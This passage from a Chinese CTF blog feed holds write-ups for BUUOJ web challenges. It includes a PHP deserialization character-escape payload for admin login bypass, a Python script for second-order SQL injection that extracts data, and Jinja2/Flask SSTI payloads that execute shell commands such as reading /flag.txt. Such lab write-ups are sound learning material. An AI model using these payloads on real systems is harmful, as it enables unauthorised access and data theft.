operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$users</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre></code></pre><p>这个网站的逻辑就是要以admin登录，通过SQL语句查询，比较ID和passwd，正确的话，跳转到<code>update.php</code>，得到flag    </p><p>主要是<code>lib.php</code>     </p><pre><code>function safe($parm)&#123;    $array = array(&#39;union&#39;, &#39;regexp&#39;, &#39;load&#39;, &#39;into&#39;, &#39;flag&#39;, &#39;file&#39;, &#39;insert&#39;, &quot;&#39;&quot;, &#39;\\&#39;, &quot;*&quot;, &quot;alter&quot;);    return str_replace($array, &#39;hacker&#39;, $parm);&#125;</code></pre><p>看到这个，应该想到那个反序列化的字符逃逸了    </p><pre><code>$this-&gt;id = $mysqli-&gt;login(&#39;select id,password from user where username=?&#39;);         </code></pre><hr><pre><code>public function __call($name, $argument)    &#123;        echo $this-&gt;CtrlCase-&gt;login($argument[0]);    &#125;</code></pre><p>两个login，而且第二个login的参数是可控的     </p><p>所以     </p><p>以此，构造pop链反序列化修改SQL语句     </p><p>入口—&gt;update.php里的       </p><pre><code>$users=new User();$users-&gt;update();        </code></pre><p>跟进<code>lib.php</code>里的update()      </p><p>首先<code>  $Info = unserialize($this-&gt;getNewinfo());</code>应该是出口了      </p><p>这个<code>$updateAction = new UpdateHelper($_SESSION[&#39;id&#39;],$Info, &quot;update user SET age=$age,nickname=$nickname where id=&quot; . $_SESSION[&#39;id&#39;]);</code>    </p><p>跟进<code>UpdateHelper</code>    </p><p><code>$sql</code>没有使用，且<code>echo $this-&gt;sql;</code>        </p><p>让<code>sql=new User()</code>来触发toString     </p><pre><code>public function __toString()    &#123;        $this-&gt;nickname-&gt;update($this-&gt;age);        return &quot;0-0&quot;;    &#125; </code></pre><p>让<code>nickname=new Info()</code>来触发<code>__call</code></p><pre><code>public function __call($name, $argument)&#123;    echo $this-&gt;CtrlCase-&gt;login($argument[0]);&#125;      </code></pre><p>接着让<code>CtrlCase=new dbCtrl()</code>就可以执行自定的SQL了    </p><p>将password修改     </p><pre><code>select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?</code></pre><p>c4ca4238a0b923820dcc509a6f75849b是1的MD5值      </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/192784/20/706/130842/608c3197Ec5588c09/d8bef464f63eb40a.png" alt="03.png"></p><p>这样再控制dbCtrl里的name和password就可以以admin登录       </p><p>之后     </p><pre><code>$_SESSION[&#39;token&#39;] = $this-&gt;name;        return $idResult;      </code></pre><p>重新登陆时不管密码是什么都能登陆成功，得到flag了     </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">UpdateHelper</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">sql</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token operator">=</span><span class="token single-quoted-string string">'select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nickname</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$CtrlCase</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">CtrlCase</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token single-quoted-string string">'1'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">UpdateHelper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre></code></pre><p>结果为</p><pre><code>O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;      </code></pre><p>回到出口处     </p><p><code>getNewInfo()</code>中     </p><pre><code>return safe(serialize(new Info($age, $nickname)));     </code></pre><p>这里序列化的是一个新类，这样的话，刚才得到的payload只会被视为一个长的字符串，并不会被反序列化       </p><p>所以要字符逃逸       </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token single-quoted-string string">'123'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$CtrlCase</span><span class="token operator">=</span><span class="token number">123</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </span></code></pre></code></pre><p>输出：<code>O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;i:1;s:8:&quot;nickname&quot;;s:3:&quot;123&quot;;s:8:&quot;CtrlCase&quot;;i:123;&#125;</code>       </p><p>要想逃逸，需要再刚才的payload前加上<code>&quot;;s:8:&quot;CtrlCase&quot;;</code>（<code>&quot;</code>来闭合序列化后生成的<code>&quot;</code>）后面加上<code>&#125;</code>来提前结束反序列化     </p><p>payload:<code>&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;</code>      </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/179326/17/1720/143813/608c2f0bEd5a3e0ed/156a14c371a68116.png" alt="02.png"></p><p>可以看到长度为263       </p><p>在双引号中加入263个union，或者其他（那个safe函数中的，只要凑够263即可）      </p><p>经过safe函数后，就多出263个，就将原来的263个逃逸出来了       </p><p>最终payload：</p><pre><code>   age=1&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;        </code></pre><p>在<code>update.php</code>页面POST提交，重新登录（admin，密码随意）得到flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>unserialize</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>unserialize</tag>
      
      <tag>char.escape</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Unfinish</title>
    <link href="/2021/04/29/BUU79/"/>
    <url>/2021/04/29/BUU79/</url>
    
    <content type="html"><![CDATA[<h2 id="SQL-二次注入"><a href="#SQL-二次注入" class="headerlink" title="SQL 二次注入"></a>SQL 二次注入</h2><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/181130/17/1544/29996/608ad77eE7e059785/fcb10cb3973eb937.png" alt="01.png">      </p><p>URL为：<code>http://0394ab22-e370-4cca-91f6-05a8ac92ab21.node3.buuoj.cn/login.php</code>     </p><p>有<code>login.php</code>,看下有没有<code>register.php</code>      </p><p>果然      </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/189730/22/621/29267/608ad7f4Eb2fe540a/175965ef798babd3.png" alt="02.png"><br>随便注册个看看<br><img src="https://img11.360buyimg.com/ddimg/jfs/t1/194217/13/548/131720/608ad830E2605bd5a/3e109deab88c8cf1.png" alt="03.png"><br>可以看到在侧边栏这里显示了我们的用户名          </p><p>二次注入       </p><p>过滤了<code>,</code>和<code>information</code><br>所以没法报错注了     </p><p>新姿势<code>0&#39;+hex(hex(database()))+&#39;0</code>       </p><p>之所以要两次hex编码是因为，一次编码产生的结果里可能有字母，加0后就成了字母前面的纯数字      </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/186262/16/1480/306644/608ad9e5Eb3f7074c/bf9784e6e02681be.png" alt="04.png">        </p><p>数字过大转为了科学计数法       </p><p>用substr,<code>,</code>被过，变为<code>from x for x</code>       </p><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/185436/35/1509/304850/608ada67E0214a5f5/8198055dc97e7fa4.png" alt="05.png">        </p><p>也可以<code>ascii(substr(database() from 1 for 1))</code></p><p>得到database()是web       </p><p>但information被过，所以没法读表啥的        </p><p>看别人WP都是猜的<code>select * from flag</code>      </p><p>(啊这)    </p><p>最后写个脚本跑一下     </p><pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">from</span> time <span class="token keyword">import</span> sleepflag <span class="token operator">=</span> <span class="token string">''</span>url <span class="token operator">=</span> <span class="token string">'http://0394ab22-e370-4cca-91f6-05a8ac92ab21.node3.buuoj.cn/'</span>url1 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">'register.php'</span>url2 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">'login.php'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>    data1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"email"</span><span class="token punctuation">:</span> <span class="token string">"1234&#123;&#125;@123.com"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"0'+ascii(substr((select * from flag) from &#123;&#125; for 1))+'0;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"123"</span><span class="token punctuation">&#125;</span>    data2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"email"</span><span class="token punctuation">:</span> <span class="token string">"1234&#123;&#125;@123.com"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"123"</span><span class="token punctuation">&#125;</span>    r1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1<span class="token punctuation">,</span> data<span class="token operator">=</span>data1<span class="token punctuation">)</span>    r2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url2<span class="token punctuation">,</span> data<span class="token operator">=</span>data2<span class="token punctuation">)</span>    res <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'&lt;span class="user-name">\s*(\d*)\s*&lt;/span>'</span><span class="token punctuation">,</span> r2<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    res1 <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'\d+'</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> flag<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>res1<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>   </code></pre></code></pre><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/175950/30/7065/148511/608adb94E422ae4f9/34785ddab5c3f6fc.png" alt="06.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>SQL</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>CTF</tag>
      
      <tag>SQL</tag>
      
      <tag>二次注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Double Secret</title>
    <link href="/2021/04/27/BUU78/"/>
    <url>/2021/04/27/BUU78/</url>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="_-__-"></a><code>_-__-</code></h2><p>打开是这样<br><img src="https://img10.360buyimg.com/ddimg/jfs/t1/172299/33/6670/3057/6087c133E05eb4964/f7d5c0725165dfea.png" alt="01.png">       </p><p>各种找，发现<code>robots.txt</code><br>有一句话—–<code>It is Android ctf</code><br>????    </p><p>然后就扫目录，<code>/secrect</code>      </p><p>得到：<code>Tell me your secret.I will encrypt it so others can&#39;t see</code>       </p><p>传入参数：<code>?secrect=123</code><br>—-&gt;<code>d]</code>      </p><p>然后试试其他的，感觉也没什么规律        </p><p>当我输了一个大的数后，  报错了<br><code>?secrect=123123</code><br><img src="https://img12.360buyimg.com/ddimg/jfs/t1/164560/32/20921/70003/6087c295Ee2b4b2b0/3375b41da3b33055.png" alt="02.png"><br>然后就不知道怎么继续了     </p><p>WP       </p><p>主要点：<br><img src="https://img13.360buyimg.com/ddimg/jfs/t1/189991/37/260/20393/6087c2e6E7772c1a4/0a96aad8ab0d1ac7.png" alt="03.png">      </p><p>对传入的参数进行RC4解密，然后经过<code>render_template_string</code><br>这里存在SSTI      </p><p>RC4加密脚本         </p><pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse<span class="token keyword">def</span> <span class="token function">rc4_main</span><span class="token punctuation">(</span>key<span class="token operator">=</span><span class="token string">"init_key"</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">"init_message"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 返回加密后得内容</span>    s_box <span class="token operator">=</span> rc4_init_sbox<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    crypt <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rc4_excrypt<span class="token punctuation">(</span>message<span class="token punctuation">,</span> s_box<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> crypt<span class="token keyword">def</span> <span class="token function">rc4_init_sbox</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    s_box <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    j <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> s_box<span class="token keyword">def</span> <span class="token function">rc4_excrypt</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> box<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> s <span class="token keyword">in</span> plain<span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        t <span class="token operator">=</span> <span class="token punctuation">(</span>box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        k <span class="token operator">=</span> box<span class="token punctuation">[</span>t<span class="token punctuation">]</span>        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">^</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>    cipher <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>res<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>key <span class="token operator">=</span> <span class="token string">"HereIsTreasure"</span>  <span class="token comment"># 此处为密文</span>message <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入明文:\n"</span><span class="token punctuation">)</span>enc_base64 <span class="token operator">=</span> rc4_main<span class="token punctuation">(</span>key<span class="token punctuation">,</span> message<span class="token punctuation">)</span>enc_init <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>enc_base64<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>enc_url <span class="token operator">=</span> parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>enc_init<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"rc4加密后的url编码:"</span> <span class="token operator">+</span> enc_url<span class="token punctuation">)</span><span class="token comment"># print("rc4加密后的base64编码"+enc_base64)</span></code></pre></code></pre><p>明文输入SSTI的payload：<br><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code>     </p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/166916/2/20756/717273/6087c89fEf400f1c8/5d5e711f5e5060ff.png" alt="05.png">      </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/186127/13/1163/8759/6087c863E6220db00/67e1250969f3a7eb.png" alt="04.png">        </p><p>虽然有个报错（那个safe函数），但还是得到了结果。</p><p><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag.txt').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code><br>得到flag       </p><p><a href="https://blog.csdn.net/qq_41381461/article/details/100991617?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-3.control&dist_request_id=&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-3.control">Rc4加密</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>I_&lt;3_Flask</title>
    <link href="/2021/04/26/BUU77/"/>
    <url>/2021/04/26/BUU77/</url>
    
    <content type="html"><![CDATA[<h2 id="1-1"><a href="#1-1" class="headerlink" title="1_1"></a>1_1</h2><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/161519/39/21188/9767/6086ba66E2717eebd/6a88b62e64abede0.png" alt="01.png">       </p><p>题目是flask，应该是SSTI了吧<br>但没参数        </p><p><a href="https://github.com/rakjong/Arjun"><code>arjun</code></a><br>这个可以来爆破参数<br>先下载，然后到arjun目录下<br><img src="https://img13.360buyimg.com/ddimg/jfs/t1/180871/9/1120/185944/6086bbb1E090ab472/52e2d85cb4d99503.png" alt="02.png">       </p><p>安装<br><img src="https://img12.360buyimg.com/ddimg/jfs/t1/196052/31/68/531183/6086bbb4E1c038775/a9233572bd309699.png" alt="03.png">        </p><p>使用<br><img src="https://img11.360buyimg.com/ddimg/jfs/t1/166728/7/20579/248205/6086bbb1E09bb265d/265b5c678e16dd73.png" alt="04.png">        </p><p>爆破出参数是name        </p><p>除此之外就没啥了<br>payload：<code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[182].__init__.__globals__.__builtins__['eval']("__import__('os').popen('ls').read()")&#125;&#125;</code>       </p><p><code>&#123;&#123;config.__class__.__init__.__globals__['os'].popen('ls').read()&#125;&#125;</code><br>两个都行<img src="https://img12.360buyimg.com/ddimg/jfs/t1/189306/16/158/12638/6086bc79E75a9f880/16bb47b996587c46.png" alt="05.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nep2</title>
    <link href="/2021/04/25/nep2/"/>
    <url>/2021/04/25/nep2/</url>
    
    <content type="html"><![CDATA[<p>视频二：<a href="https://www.hacker101.com/sessions/pentest_owasp">https://www.hacker101.com/sessions/pentest_owasp</a></p><p>1.目前owasp的十大web安全漏洞是哪些？这些漏洞排名是按照漏洞的严重程度排序的还是按照漏洞的常见程度排序的？（2分）</p><pre><code>1. Injection----&gt;注入，Sql，nosql,OS injection,LDAP injection       2. Broken Authentication---&gt;失效的身份认证和会话管理3. Sensitive Data Exposure----&gt;敏感数据泄露4. XXE5. Broken Access Control----&gt;越权6. Security Misconfiguration.---&gt;安全配置   7. XSS8. Insecure Deserialization----&gt;不安全的反序列化9. Using Components with Known Vulnerabilities----&gt;使用不安全的组件 10. Insufficient Logging &amp; Monitoring.----&gt;日志和监控不足严重程度</code></pre><p>2.请翻译一下credential stuffing（1分）</p><pre><code>密码嗅探    </code></pre><p><a href="https://blog.csdn.net/weixin_44549063/article/details/113518965">credential stuffing attack—-&gt;撞库</a></p><p>3.为什么说不充分的日志记录(insufficient logging)也算owasp十大漏洞的一种？他的危害性如何（2分）</p><pre><code>日志记录不足，会使攻击者进一步攻击系统，保持持久性       owasp tenth</code></pre><p>4.请翻阅一下owasp testing guide，以及owasp testing guide check-list，视频说怎么结合这两个文档来学习渗透测试？ 结合你平时渗透过程中的经验，谈谈你的感想。（3分）   </p><pre><code>利用owasp testing guide check-list查找到相关部分进行学习      小白，还没渗透过。。。。。。。。。         </code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JustEscape</title>
    <link href="/2021/04/25/BUU76/"/>
    <url>/2021/04/25/BUU76/</url>
    
